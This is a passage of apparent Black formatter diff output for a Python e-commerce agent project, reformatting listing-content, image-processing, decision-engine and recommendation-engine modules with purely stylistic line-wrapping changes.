         return enhanced_text
 
     def _get_relevant_keywords(self, product_data: Dict[str, Any]) -> List[str]:
         """Get relevant keywords for SEO analysis."""
         category = product_data.get("category", "default")
         base_keywords = self.seo_keywords.get(category, self.seo_keywords["default"])
-        
+
         # Add product-specific keywords
         product_keywords = [
             product_data.get("brand", "").lower(),
             product_data.get("name", "").lower(),
             product_data.get("model", "").lower(),
         ]
-        
+
         return base_keywords + [k for k in product_keywords if k]
 
-    async def _optimize_for_seo(self, content: Dict[str, Any]) -> tuple[Dict[str, Any], List[str]]:
+    async def _optimize_for_seo(
+        self, content: Dict[str, Any]
+    ) -> tuple[Dict[str, Any], List[str]]:
         """Optimize content for SEO."""
         improvements = []
-        
+
         # Add SEO improvements logic here
         if "title" in content and len(content["title"]) < 50:
             content["title"] += " - Premium Quality"
             improvements.append("Enhanced title with SEO keywords")
-            
+
         return content, improvements
 
-    async def _optimize_for_conversion(self, content: Dict[str, Any]) -> tuple[Dict[str, Any], List[str]]:
+    async def _optimize_for_conversion(
+        self, content: Dict[str, Any]
+    ) -> tuple[Dict[str, Any], List[str]]:
         """Optimize content for conversion."""
         improvements = []
-        
+
         # Add conversion optimization logic here
-        if "description" in content and "guarantee" not in content["description"].lower():
+        if (
+            "description" in content
+            and "guarantee" not in content["description"].lower()
+        ):
             content["description"] += " Backed by our satisfaction guarantee!"
             improvements.append("Added satisfaction guarantee for better conversion")
-            
+
         return content, improvements
 
-    async def _optimize_for_readability(self, content: Dict[str, Any]) -> tuple[Dict[str, Any], List[str]]:
+    async def _optimize_for_readability(
+        self, content: Dict[str, Any]
+    ) -> tuple[Dict[str, Any], List[str]]:
         """Optimize content for readability."""
         improvements = []
-        
+
         # Add readability improvements logic here
         if "description" in content:
             # Simple sentence break improvement
             description = content["description"]
             if ". " not in description and len(description) > 100:
                 # Add sentence breaks for better readability
                 content["description"] = description.replace(", ", ". ", 1)
-                improvements.append("Improved sentence structure for better readability")
-                
+                improvements.append(
+                    "Improved sentence structure for better readability"
+                )
+
         return content, improvements
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/content/listing_content_agent.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/content/image_agent.py	2025-06-14 20:35:30.759670+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/content/image_agent.py	2025-06-19 04:03:37.727218+00:00
@@ -81,17 +81,19 @@
         }
 
     def _get_required_config_fields(self) -> List[str]:
         """Get required configuration fields."""
         fields = super()._get_required_config_fields()
-        fields.extend([
-            "image_processing_service",
-            "storage_service",
-            "cdn_url",
-            "watermark_enabled",
-            "auto_enhancement_enabled",
-        ])
+        fields.extend(
+            [
+                "image_processing_service",
+                "storage_service",
+                "cdn_url",
+                "watermark_enabled",
+                "auto_enhancement_enabled",
+            ]
+        )
         return fields
 
     async def _setup_content_resources(self) -> None:
         """Set up image processing resources."""
         # Initialize image processing libraries and services
@@ -134,11 +136,13 @@
             if processing_type == "optimize":
                 result = await self.optimize_images_for_marketplace(image_urls)
             elif processing_type == "enhance":
                 result = await self.enhance_image_quality(image_urls)
             elif processing_type == "batch_process":
-                result = await self.batch_process_images(image_urls, event.get("operations", []))
+                result = await self.batch_process_images(
+                    image_urls, event.get("operations", [])
+                )
             else:
                 result = await self.analyze_images(image_urls)
 
             self.metrics["content_generated"] += len(image_urls)
             logger.info(f"Processed {len(image_urls)} images with {processing_type}")
@@ -148,15 +152,19 @@
 
     async def _handle_optimization_event(self, event: Dict[str, Any]) -> None:
         """Handle image optimization events."""
         try:
             images = event.get("images", [])
-            optimization_goals = event.get("goals", ["quality", "size", "marketplace_compliance"])
+            optimization_goals = event.get(
+                "goals", ["quality", "size", "marketplace_compliance"]
+            )
 
             result = await self.optimize_images_for_goals(images, optimization_goals)
             self.metrics["content_optimized"] += len(images)
-            logger.info(f"Optimized {len(images)} images for goals: {optimization_goals}")
+            logger.info(
+                f"Optimized {len(images)} images for goals: {optimization_goals}"
+            )
 
         except Exception as e:
             logger.error(f"Error handling image optimization event: {e}")
 
     async def _generate_content(self, task: Dict[str, Any]) -> Dict[str, Any]:
@@ -177,11 +185,15 @@
                 raise ValueError(f"Unknown image operation: {operation}")
 
             end_time = datetime.now(timezone.utc)
             self.metrics["generation_latency"] = (end_time - start_time).total_seconds()
 
-            return {"result": result, "success": True, "processing_time": self.metrics["generation_latency"]}
+            return {
+                "result": result,
+                "success": True,
+                "processing_time": self.metrics["generation_latency"],
+            }
 
         except Exception as e:
             logger.error(f"Error processing images: {e}")
             return {"error": str(e), "success": False}
 
@@ -193,11 +205,13 @@
 
             start_time = datetime.now(timezone.utc)
             optimized_images = await self.optimize_images_for_goals(images, goals)
             end_time = datetime.now(timezone.utc)
 
-            self.metrics["optimization_latency"] = (end_time - start_time).total_seconds()
+            self.metrics["optimization_latency"] = (
+                end_time - start_time
+            ).total_seconds()
 
             return {
                 "original_images": images,
                 "optimized_images": optimized_images,
                 "optimization_goals": goals,
@@ -207,14 +221,18 @@
 
         except Exception as e:
             logger.error(f"Error optimizing images: {e}")
             return {"error": str(e), "success": False}
 
-    async def optimize_images_for_marketplace(self, image_urls: List[str]) -> Dict[str, Any]:
+    async def optimize_images_for_marketplace(
+        self, image_urls: List[str]
+    ) -> Dict[str, Any]:
         """Optimize images for specific marketplace requirements."""
         try:
-            specs = self.marketplace_specs.get(self.marketplace, self.marketplace_specs["ebay"])
+            specs = self.marketplace_specs.get(
+                self.marketplace, self.marketplace_specs["ebay"]
+            )
             optimized_images = []
 
             for url in image_urls:
                 # Simulate image processing
                 image_info = await self._analyze_image(url)
@@ -234,28 +252,36 @@
                 if image_info["format"] not in specs["supported_formats"]:
                     optimizations.append("convert_format")
 
                 # Check aspect ratio
                 aspect_ratio = image_info["resolution"][0] / image_info["resolution"][1]
-                if not (specs["aspect_ratio_range"][0] <= aspect_ratio <= specs["aspect_ratio_range"][1]):
+                if not (
+                    specs["aspect_ratio_range"][0]
+                    <= aspect_ratio
+                    <= specs["aspect_ratio_range"][1]
+                ):
                     optimizations.append("crop_to_ratio")
 
                 # Apply optimizations
                 optimized_url = await self._apply_optimizations(url, optimizations)
 
-                optimized_images.append({
-                    "original_url": url,
-                    "optimized_url": optimized_url,
-                    "optimizations_applied": optimizations,
-                    "marketplace_compliant": len(optimizations) == 0,
-                })
+                optimized_images.append(
+                    {
+                        "original_url": url,
+                        "optimized_url": optimized_url,
+                        "optimizations_applied": optimizations,
+                        "marketplace_compliant": len(optimizations) == 0,
+                    }
+                )
 
             return {
                 "optimized_images": optimized_images,
                 "marketplace": self.marketplace,
                 "total_processed": len(image_urls),
-                "compliant_count": sum(1 for img in optimized_images if img["marketplace_compliant"]),
+                "compliant_count": sum(
+                    1 for img in optimized_images if img["marketplace_compliant"]
+                ),
                 "processed_at": datetime.now(timezone.utc).isoformat(),
             }
 
         except Exception as e:
             logger.error(f"Error optimizing images for marketplace: {e}")
@@ -268,25 +294,32 @@
 
             for url in image_urls:
                 # Simulate quality enhancement
                 enhancements = await self._apply_quality_enhancements(url)
 
-                enhanced_images.append({
-                    "original_url": url,
-                    "enhanced_url": enhancements["enhanced_url"],
-                    "quality_score_before": enhancements["quality_before"],
-                    "quality_score_after": enhancements["quality_after"],
-                    "enhancements_applied": enhancements["applied"],
-                })
+                enhanced_images.append(
+                    {
+                        "original_url": url,
+                        "enhanced_url": enhancements["enhanced_url"],
+                        "quality_score_before": enhancements["quality_before"],
+                        "quality_score_after": enhancements["quality_after"],
+                        "enhancements_applied": enhancements["applied"],
+                    }
+                )
 
             return {
                 "enhanced_images": enhanced_images,
                 "total_processed": len(image_urls),
-                "average_quality_improvement": sum(
-                    img["quality_score_after"] - img["quality_score_before"]
-                    for img in enhanced_images
-                ) / len(enhanced_images) if enhanced_images else 0,
+                "average_quality_improvement": (
+                    sum(
+                        img["quality_score_after"] - img["quality_score_before"]
+                        for img in enhanced_images
+                    )
+                    / len(enhanced_images)
+                    if enhanced_images
+                    else 0
+                ),
                 "processed_at": datetime.now(timezone.utc).isoformat(),
             }
 
         except Exception as e:
             logger.error(f"Error enhancing image quality: {e}")
@@ -301,43 +334,59 @@
                 analysis = await self._comprehensive_image_analysis(url)
                 analysis_results.append(analysis)
 
             # Aggregate analysis
             total_images = len(analysis_results)
-            compliant_images = sum(1 for a in analysis_results if a["marketplace_compliant"])
-            avg_quality = sum(a["quality_score"] for a in analysis_results) / total_images if total_images else 0
+            compliant_images = sum(
+                1 for a in analysis_results if a["marketplace_compliant"]
+            )
+            avg_quality = (
+                sum(a["quality_score"] for a in analysis_results) / total_images
+                if total_images
+                else 0
+            )
 
             return {
                 "image_analyses": analysis_results,
                 "summary": {
                     "total_images": total_images,
                     "compliant_images": compliant_images,
-                    "compliance_rate": compliant_images / total_images if total_images else 0,
+                    "compliance_rate": (
+                        compliant_images / total_images if total_images else 0
+                    ),
                     "average_quality_score": avg_quality,
                     "marketplace": self.marketplace,
                 },
-                "recommendations": self._generate_optimization_recommendations(analysis_results),
+                "recommendations": self._generate_optimization_recommendations(
+                    analysis_results
+                ),
                 "analyzed_at": datetime.now(timezone.utc).isoformat(),
             }
 
         except Exception as e:
             logger.error(f"Error analyzing images: {e}")
             return {"error": str(e)}
 
-    async def batch_process_images(self, image_urls: List[str], operations: List[str]) -> Dict[str, Any]:
+    async def batch_process_images(
+        self, image_urls: List[str], operations: List[str]
+    ) -> Dict[str, Any]:
         """Process multiple images with specified operations."""
         try:
             processed_images = []
 
             for url in image_urls:
                 result = {"original_url": url, "operations": {}}
 
                 for operation in operations:
                     if operation in self.processors:
-                        result["operations"][operation] = await self.processors[operation](url)
+                        result["operations"][operation] = await self.processors[
+                            operation
+                        ](url)
                     else:
-                        result["operations"][operation] = {"error": f"Unknown operation: {operation}"}
+                        result["operations"][operation] = {
+                            "error": f"Unknown operation: {operation}"
+                        }
 
                 processed_images.append(result)
 
             return {
                 "processed_images": processed_images,
@@ -381,17 +430,21 @@
             "applied": ["noise_reduction", "sharpening", "color_correction"],
         }
 
     async def _comprehensive_image_analysis(self, url: str) -> Dict[str, Any]:
         """Perform comprehensive image analysis."""
-        specs = self.marketplace_specs.get(self.marketplace, self.marketplace_specs["ebay"])
+        specs = self.marketplace_specs.get(
+            self.marketplace, self.marketplace_specs["ebay"]
+        )
         image_info = await self._analyze_image(url)
 
         # Check marketplace compliance
         compliance_checks = {
             "resolution_ok": (
-                specs["min_resolution"][0] <= image_info["resolution"][0] <= specs["max_resolution"][0]
+                specs["min_resolution"][0]
+                <= image_info["resolution"][0]
+                <= specs["max_resolution"][0]
             ),
             "file_size_ok": image_info["file_size"] <= specs["max_file_size"],
             "format_ok": image_info["format"] in specs["supported_formats"],
             "aspect_ratio_ok": True,  # Simplified check
         }
@@ -400,14 +453,18 @@
             "url": url,
             "image_info": image_info,
             "compliance_checks": compliance_checks,
             "marketplace_compliant": all(compliance_checks.values()),
             "quality_score": image_info["quality_score"],
-            "optimization_opportunities": self._identify_optimization_opportunities(image_info, specs),
-        }
-
-    def _identify_optimization_opportunities(self, image_info: Dict[str, Any], specs: Dict[str, Any]) -> List[str]:
+            "optimization_opportunities": self._identify_optimization_opportunities(
+                image_info, specs
+            ),
+        }
+
+    def _identify_optimization_opportunities(
+        self, image_info: Dict[str, Any], specs: Dict[str, Any]
+    ) -> List[str]:
         """Identify optimization opportunities for an image."""
         opportunities = []
 
         if image_info["quality_score"] < 80:
             opportunities.append("quality_enhancement")
@@ -416,22 +473,28 @@
             opportunities.append("compression")
 
         if image_info["resolution"][0] < specs["min_resolution"][0] * 1.2:
             opportunities.append("upscaling")
 
-        if not image_info["has_watermark"] and self.config.get("watermark_enabled", False):
+        if not image_info["has_watermark"] and self.config.get(
+            "watermark_enabled", False
+        ):
             opportunities.append("watermark_addition")
 
         return opportunities
 
-    def _generate_optimization_recommendations(self, analyses: List[Dict[str, Any]]) -> List[str]:
+    def _generate_optimization_recommendations(
+        self, analyses: List[Dict[str, Any]]
+    ) -> List[str]:
         """Generate optimization recommendations based on analysis results."""
         recommendations = []
 
         non_compliant = [a for a in analyses if not a["marketplace_compliant"]]
         if non_compliant:
-            recommendations.append(f"Fix compliance issues for {len(non_compliant)} images")
+            recommendations.append(
+                f"Fix compliance issues for {len(non_compliant)} images"
+            )
 
         low_quality = [a for a in analyses if a["quality_score"] < 80]
         if low_quality:
             recommendations.append(f"Enhance quality for {len(low_quality)} images")
 
@@ -449,25 +512,36 @@
         """Enhance image quality."""
         return {"enhanced_url": url.replace(".jpg", "_enhanced.jpg"), "success": True}
 
     async def _compress_image(self, url: str) -> Dict[str, Any]:
         """Compress image."""
-        return {"compressed_url": url.replace(".jpg", "_compressed.jpg"), "success": True}
+        return {
+            "compressed_url": url.replace(".jpg", "_compressed.jpg"),
+            "success": True,
+        }
 
     async def _add_watermark(self, url: str) -> Dict[str, Any]:
         """Add watermark to image."""
-        return {"watermarked_url": url.replace(".jpg", "_watermarked.jpg"), "success": True}
+        return {
+            "watermarked_url": url.replace(".jpg", "_watermarked.jpg"),
+            "success": True,
+        }
 
     async def _remove_background(self, url: str) -> Dict[str, Any]:
         """Remove background from image."""
-        return {"background_removed_url": url.replace(".jpg", "_nobg.jpg"), "success": True}
+        return {
+            "background_removed_url": url.replace(".jpg", "_nobg.jpg"),
+            "success": True,
+        }
 
     async def _convert_format(self, url: str) -> Dict[str, Any]:
         """Convert image format."""
         return {"converted_url": url.replace(".jpg", ".png"), "success": True}
 
-    async def optimize_images_for_goals(self, images: List[str], goals: List[str]) -> List[Dict[str, Any]]:
+    async def optimize_images_for_goals(
+        self, images: List[str], goals: List[str]
+    ) -> List[Dict[str, Any]]:
         """Optimize images for specific goals."""
         optimized = []
 
         for image_url in images:
             result = {"original_url": image_url, "optimizations": []}
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/content/image_agent.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/executive/advanced_decision_engine.py	2025-06-14 20:35:30.763679+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/executive/advanced_decision_engine.py	2025-06-19 04:03:37.721626+00:00
@@ -92,13 +92,11 @@
             self.criteria_weights[criterion.name] = criterion.weight
 
         logger.info(f"Added {len(criteria)} decision criteria")
 
     def normalize_scores(
-        self,
-        options: List[DecisionOption],
-        criteria: List[DecisionCriteria]
+        self, options: List[DecisionOption], criteria: List[DecisionCriteria]
     ) -> List[DecisionOption]:
         """
         Normalize scores across all options and criteria.
 
         Args:
@@ -115,25 +113,30 @@
                 option_id=option.option_id,
                 name=option.name,
                 description=option.description,
                 metadata=option.metadata.copy(),
                 confidence=option.confidence,
-                risk_level=option.risk_level
+                risk_level=option.risk_level,
             )
 
             for criterion in criteria:
                 if criterion.name in option.scores:
                     raw_score = option.scores[criterion.name]
 
                     # Normalize based on min/max values
-                    if criterion.min_value is not None and criterion.max_value is not None:
+                    if (
+                        criterion.min_value is not None
+                        and criterion.max_value is not None
+                    ):
                         normalized_score = (raw_score - criterion.min_value) / (
                             criterion.max_value - criterion.min_value
                         )
                     else:
                         # Use z-score normalization
-                        all_scores = [opt.scores.get(criterion.name, 0) for opt in options]
+                        all_scores = [
+                            opt.scores.get(criterion.name, 0) for opt in options
+                        ]
                         mean_score = np.mean(all_scores)
                         std_score = np.std(all_scores)
 
                         if std_score > 0:
                             normalized_score = (raw_score - mean_score) / std_score
@@ -142,22 +145,22 @@
 
                     # Invert if minimizing
                     if not criterion.is_maximizing:
                         normalized_score = 1.0 - normalized_score
 
-                    normalized_option.scores[criterion.name] = max(0, min(1, normalized_score))
+                    normalized_option.scores[criterion.name] = max(
+                        0, min(1, normalized_score)
+                    )
                 else:
                     normalized_option.scores[criterion.name] = 0.0
 
             normalized_options.append(normalized_option)
 
         return normalized_options
 
     def calculate_weighted_scores(
-        self,
-        options: List[DecisionOption],
-        criteria: List[DecisionCriteria]
+        self, options: List[DecisionOption], criteria: List[DecisionCriteria]
     ) -> List[Tuple[DecisionOption, float]]:
         """
         Calculate weighted scores for all options.
 
         Args:
@@ -225,11 +228,11 @@
 
     async def make_decision(
         self,
         options: List[DecisionOption],
         criteria: List[DecisionCriteria],
-        context: Optional[Dict[str, Any]] = None
+        context: Optional[Dict[str, Any]] = None,
     ) -> DecisionResult:
         """
         Make a decision using multi-criteria analysis.
 
         Args:
@@ -271,11 +274,13 @@
             all_options=[opt for opt, _ in scored_options],
             criteria=criteria,
             total_score=best_score,
             confidence=best_option.confidence,
             explanation=explanation,
-            reasoning_steps=self._generate_reasoning_steps(best_option, criteria, scored_options)
+            reasoning_steps=self._generate_reasoning_steps(
+                best_option, criteria, scored_options
+            ),
         )
 
         # Store in history
         self.decision_history.append(result)
 
@@ -285,19 +290,19 @@
 
     def _generate_explanation(
         self,
         selected_option: DecisionOption,
         criteria: List[DecisionCriteria],
-        scored_options: List[Tuple[DecisionOption, float]]
+        scored_options: List[Tuple[DecisionOption, float]],
     ) -> str:
         """Generate human-readable explanation for the decision."""
         explanation_parts = [
             f"Selected option: {selected_option.name}",
             f"Total score: {scored_options[0][1]:.3f}",
             f"Risk level: {selected_option.risk_level}",
             "",
-            "Key factors:"
+            "Key factors:",
         ]
 
         # Add top criteria contributions
         for criterion in criteria[:3]:  # Top 3 criteria
             if criterion.name in selected_option.scores:
@@ -310,17 +315,17 @@
 
     def _generate_reasoning_steps(
         self,
         selected_option: DecisionOption,
         criteria: List[DecisionCriteria],
-        scored_options: List[Tuple[DecisionOption, float]]
+        scored_options: List[Tuple[DecisionOption, float]],
     ) -> List[str]:
         """Generate step-by-step reasoning for the decision."""
         steps = [
             f"Evaluated {len(scored_options)} options against {len(criteria)} criteria",
             f"Normalized scores across all criteria",
             f"Applied weighted scoring with criteria weights",
             f"Selected highest scoring option: {selected_option.name}",
-            f"Assessed risk level: {selected_option.risk_level}"
+            f"Assessed risk level: {selected_option.risk_level}",
         ]
 
         return steps
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/executive/advanced_decision_engine.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/conversational/recommendation_engine.py	2025-06-14 20:35:30.763679+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/conversational/recommendation_engine.py	2025-06-19 04:03:38.070719+00:00
@@ -14,11 +14,11 @@
 
 
 class RecommendationEngine:
     """
     Proactive recommendation engine for conversational interface.
-    
+
     Capabilities:
     - AI-driven product recommendations
     - Market opportunity identification
     - Performance optimization suggestions
     - Proactive alerts and insights
@@ -50,11 +50,11 @@
         # Recommendation models
         self.user_profiles = {}
         self.market_data = {}
         self.performance_baselines = {}
         self.recommendation_history = []
-        
+
         # Recommendation types
         self.recommendation_types = {
             "product_opportunities": "New product opportunities based on market trends",
             "pricing_optimization": "Pricing adjustments for better performance",
             "inventory_management": "Inventory optimization recommendations",
@@ -62,11 +62,11 @@
             "market_expansion": "New marketplace or category opportunities",
             "performance_alerts": "Performance issues requiring attention",
             "seasonal_trends": "Seasonal opportunities and preparations",
             "competitor_insights": "Competitive intelligence and responses",
         }
-        
+
         # Scoring weights
         self.scoring_weights = {
             "market_potential": 0.3,
             "user_relevance": 0.25,
             "implementation_ease": 0.2,
@@ -127,34 +127,40 @@
     ) -> List[Dict[str, Any]]:
         """Generate personalized recommendations for a user."""
         try:
             # Get user profile
             user_profile = await self._get_user_profile(user_id)
-            
+
             # Generate recommendations from different models
             all_recommendations = []
-            
+
             for model_name, model_func in self.recommendation_models.items():
                 model_recs = await model_func(user_profile, context)
                 for rec in model_recs:
                     rec["source_model"] = model_name
                 all_recommendations.extend(model_recs)
-            
+
             # Score and rank recommendations
-            scored_recommendations = await self._score_recommendations(all_recommendations, user_profile, context)
-            
+            scored_recommendations = await self._score_recommendations(
+                all_recommendations, user_profile, context
+            )
+
             # Remove duplicates and apply filters
-            filtered_recommendations = await self._filter_recommendations(scored_recommendations, user_profile)
-            
+            filtered_recommendations = await self._filter_recommendations(
+                scored_recommendations, user_profile
+            )
+
             # Sort by score and limit results
-            final_recommendations = sorted(filtered_recommendations, key=lambda x: x["score"], reverse=True)[:limit]
-            
+            final_recommendations = sorted(
+                filtered_recommendations, key=lambda x: x["score"], reverse=True
+            )[:limit]
+
             # Update recommendation history
             await self._update_recommendation_history(user_id, final_recommendations)
-            
+
             return final_recommendations
-            
+
         except Exception as e:
             logger.error(f"Error generating recommendations: {e}")
             return []
 
     async def _get_user_profile(self, user_id: str) -> Dict[str, Any]:
@@ -166,241 +172,280 @@
                 "behavior_history": [],
                 "performance_metrics": {},
                 "last_active": datetime.now(timezone.utc).isoformat(),
                 "created_at": datetime.now(timezone.utc).isoformat(),
             }
-        
+
         return self.user_profiles[user_id]
 
     async def _collaborative_filtering_recommendations(
         self, user_profile: Dict[str, Any], context: Optional[Dict[str, Any]]
     ) -> List[Dict[str, Any]]:
         """Generate collaborative filtering recommendations."""
         recommendations = []
-        
+
         # Simulate collaborative filtering
         similar_users_products = [
             {"product": "iPhone 15 Pro", "category": "electronics", "confidence": 0.85},
-            {"product": "Samsung Galaxy S24", "category": "electronics", "confidence": 0.78},
+            {
+                "product": "Samsung Galaxy S24",
+                "category": "electronics",
+                "confidence": 0.78,
+            },
             {"product": "MacBook Air", "category": "electronics", "confidence": 0.72},
         ]
-        
+
         for item in similar_users_products:
-            recommendations.append({
-                "type": "product_opportunities",
-                "title": f"Consider listing {item['product']}",
-                "description": f"Similar sellers are having success with {item['product']}",
-                "action": "research_product",
-                "data": item,
-                "confidence": item["confidence"],
-                "priority": "medium",
-            })
-        
+            recommendations.append(
+                {
+                    "type": "product_opportunities",
+                    "title": f"Consider listing {item['product']}",
+                    "description": f"Similar sellers are having success with {item['product']}",
+                    "action": "research_product",
+                    "data": item,
+                    "confidence": item["confidence"],
+                    "priority": "medium",
+                }
+            )
+
         return recommendations
 
     async def _content_based_recommendations(
         self, user_profile: Dict[str, Any], context: Optional[Dict[str, Any]]
     ) -> List[Dict[str, Any]]:
         """Generate content-based recommendations."""
         recommendations = []
-        
+
         # Simulate content-based recommendations
-        user_categories = user_profile.get("preferences", {}).get("categories", ["electronics"])
-        
+        user_categories = user_profile.get("preferences", {}).get(
+            "categories", ["electronics"]
+        )
+
         for category in user_categories:
-            recommendations.append({
-                "type": "listing_improvements",
-                "title": f"Optimize your {category} listings",
-                "description": f"Your {category} listings could benefit from SEO improvements",
-                "action": "optimize_listings",
-                "data": {"category": category, "improvement_potential": 0.15},
-                "confidence": 0.75,
-                "priority": "medium",
-            })
-        
+            recommendations.append(
+                {
+                    "type": "listing_improvements",
+                    "title": f"Optimize your {category} listings",
+                    "description": f"Your {category} listings could benefit from SEO improvements",
+                    "action": "optimize_listings",
+                    "data": {"category": category, "improvement_potential": 0.15},
+                    "confidence": 0.75,
+                    "priority": "medium",
+                }
+            )
+
         return recommendations
 
     async def _market_based_recommendations(
         self, user_profile: Dict[str, Any], context: Optional[Dict[str, Any]]
     ) -> List[Dict[str, Any]]:
         """Generate market-based recommendations."""
         recommendations = []
-        
+
         # Trending categories
         for category in self.market_data["trending_categories"]:
-            recommendations.append({
-                "type": "market_expansion",
-                "title": f"Explore {category} category",
-                "description": f"{category} is trending with high demand",
-                "action": "explore_category",
-                "data": {"category": category, "trend_strength": 0.8},
-                "confidence": 0.7,
-                "priority": "high",
-            })
-        
+            recommendations.append(
+                {
+                    "type": "market_expansion",
+                    "title": f"Explore {category} category",
+                    "description": f"{category} is trending with high demand",
+                    "action": "explore_category",
+                    "data": {"category": category, "trend_strength": 0.8},
+                    "confidence": 0.7,
+                    "priority": "high",
+                }
+            )
+
         # Seasonal opportunities
         seasonal_data = self.market_data["seasonal_trends"]
         for product in seasonal_data["trending_products"][:2]:
-            recommendations.append({
-                "type": "seasonal_trends",
-                "title": f"Seasonal opportunity: {product}",
-                "description": f"{product} is trending for {seasonal_data['current_season']}",
-                "action": "research_seasonal_product",
-                "data": {"product": product, "season": seasonal_data["current_season"]},
-                "confidence": 0.8,
-                "priority": "high",
-            })
-        
+            recommendations.append(
+                {
+                    "type": "seasonal_trends",
+                    "title": f"Seasonal opportunity: {product}",
+                    "description": f"{product} is trending for {seasonal_data['current_season']}",
+                    "action": "research_seasonal_product",
+                    "data": {
+                        "product": product,
+                        "season": seasonal_data["current_season"],
+                    },
+                    "confidence": 0.8,
+                    "priority": "high",
+                }
+            )
+
         return recommendations
 
     async def _performance_based_recommendations(
         self, user_profile: Dict[str, Any], context: Optional[Dict[str, Any]]
     ) -> List[Dict[str, Any]]:
         """Generate performance-based recommendations."""
         recommendations = []
-        
+
         # Simulate performance analysis
         user_metrics = user_profile.get("performance_metrics", {})
-        
+
         # Check conversion rate
         user_conversion = user_metrics.get("conversion_rate", 0.02)
         baseline_conversion = self.performance_baselines["conversion_rate"]
-        
+
         if user_conversion < baseline_conversion * 0.8:
-            recommendations.append({
-                "type": "performance_alerts",
-                "title": "Low conversion rate detected",
-                "description": f"Your conversion rate ({user_conversion:.1%}) is below average ({baseline_conversion:.1%})",
-                "action": "improve_conversion",
-                "data": {"current": user_conversion, "target": baseline_conversion},
-                "confidence": 0.9,
-                "priority": "high",
-            })
-        
+            recommendations.append(
+                {
+                    "type": "performance_alerts",
+                    "title": "Low conversion rate detected",
+                    "description": f"Your conversion rate ({user_conversion:.1%}) is below average ({baseline_conversion:.1%})",
+                    "action": "improve_conversion",
+                    "data": {"current": user_conversion, "target": baseline_conversion},
+                    "confidence": 0.9,
+                    "priority": "high",
+                }
+            )
+
         # Check pricing
         user_price = user_metrics.get("average_selling_price", 40.0)
         baseline_price = self.performance_baselines["average_selling_price"]
-        
+
         if user_price < baseline_price * 0.9:
-            recommendations.append({
-                "type": "pricing_optimization",
-                "title": "Consider price optimization",
-                "description": f"Your average price (${user_price:.2f}) may be too low",
-                "action": "analyze_pricing",
-                "data": {"current_price": user_price, "market_average": baseline_price},
-                "confidence": 0.75,
-                "priority": "medium",
-            })
-        
+            recommendations.append(
+                {
+                    "type": "pricing_optimization",
+                    "title": "Consider price optimization",
+                    "description": f"Your average price (${user_price:.2f}) may be too low",
+                    "action": "analyze_pricing",
+                    "data": {
+                        "current_price": user_price,
+                        "market_average": baseline_price,
+                    },
+                    "confidence": 0.75,
+                    "priority": "medium",
+                }
+            )
+
         return recommendations
 
     async def _trend_based_recommendations(
         self, user_profile: Dict[str, Any], context: Optional[Dict[str, Any]]
     ) -> List[Dict[str, Any]]:
         """Generate trend-based recommendations."""
         recommendations = []
-        
+
         # Price trend recommendations
         for category, trend_data in self.market_data["price_trends"].items():
             if trend_data["trend"] == "rising" and trend_data["change"] > 0.05:
-                recommendations.append({
-                    "type": "pricing_optimization",
-                    "title": f"Price increase opportunity in {category}",
-                    "description": f"{category} prices are rising ({trend_data['change']:+.1%})",
-                    "action": "consider_price_increase",
-                    "data": {"category": category, "trend": trend_data},
-                    "confidence": 0.8,
-                    "priority": "medium",
-                })
-        
+                recommendations.append(
+                    {
+                        "type": "pricing_optimization",
+                        "title": f"Price increase opportunity in {category}",
+                        "description": f"{category} prices are rising ({trend_data['change']:+.1%})",
+                        "action": "consider_price_increase",
+                        "data": {"category": category, "trend": trend_data},
+                        "confidence": 0.8,
+                        "priority": "medium",
+                    }
+                )
+
         return recommendations
 
     async def _score_recommendations(
-        self, recommendations: List[Dict[str, Any]], user_profile: Dict[str, Any], context: Optional[Dict[str, Any]]
+        self,
+        recommendations: List[Dict[str, Any]],
+        user_profile: Dict[str, Any],
+        context: Optional[Dict[str, Any]],
     ) -> List[Dict[str, Any]]:
         """Score recommendations based on multiple factors."""
         scored_recommendations = []
-        
+
         for rec in recommendations:
             score = 0.0
-            
+
             # Market potential score
             market_score = self._calculate_market_potential_score(rec)
             score += market_score * self.scoring_weights["market_potential"]
-            
+
             # User relevance score
             relevance_score = self._calculate_user_relevance_score(rec, user_profile)
             score += relevance_score * self.scoring_weights["user_relevance"]
-            
+
             # Implementation ease score
             ease_score = self._calculate_implementation_ease_score(rec)
             score += ease_score * self.scoring_weights["implementation_ease"]
-            
+
             # Expected impact score
             impact_score = self._calculate_expected_impact_score(rec)
             score += impact_score * self.scoring_weights["expected_impact"]
-            
+
             # Urgency score
             urgency_score = self._calculate_urgency_score(rec)
             score += urgency_score * self.scoring_weights["urgency"]
-            
+
             rec["score"] = score
             rec["score_breakdown"] = {
                 "market_potential": market_score,
                 "user_relevance": relevance_score,
                 "implementation_ease": ease_score,
                 "expected_impact": impact_score,
                 "urgency": urgency_score,
             }
-            
+
             scored_recommendations.append(rec)
-        
+
         return scored_recommendations
 
-    def _calculate_market_potential_score(self, recommendation: Dict[str, Any]) -> float:
+    def _calculate_market_potential_score(
+        self, recommendation: Dict[str, Any]
+    ) -> float:
         """Calculate market potential score."""
         rec_type = recommendation.get("type", "")
         confidence = recommendation.get("confidence", 0.5)
-        
+
         # Base score from confidence
         score = confidence
-        
+
         # Boost for high-potential types
-        high_potential_types = ["market_expansion", "seasonal_trends", "product_opportunities"]
+        high_potential_types = [
+            "market_expansion",
+            "seasonal_trends",
+            "product_opportunities",
+        ]
         if rec_type in high_potential_types:
             score += 0.2
-        
+
         return min(1.0, score)
 
-    def _calculate_user_relevance_score(self, recommendation: Dict[str, Any], user_profile: Dict[str, Any]) -> float:
+    def _calculate_user_relevance_score(
+        self, recommendation: Dict[str, Any], user_profile: Dict[str, Any]
+    ) -> float:
         """Calculate user relevance score."""
         score = 0.5  # Base score
-        
+
         # Check if recommendation matches user's categories
         rec_data = recommendation.get("data", {})
         rec_category = rec_data.get("category", "")
         user_categories = user_profile.get("preferences", {}).get("categories", [])
-        
+
         if rec_category in user_categories:
             score += 0.3
-        
+
         # Check user's experience level
         user_experience = user_profile.get("experience_level", "intermediate")
         if user_experience == "beginner" and recommendation.get("priority") == "high":
             score += 0.2
-        
+
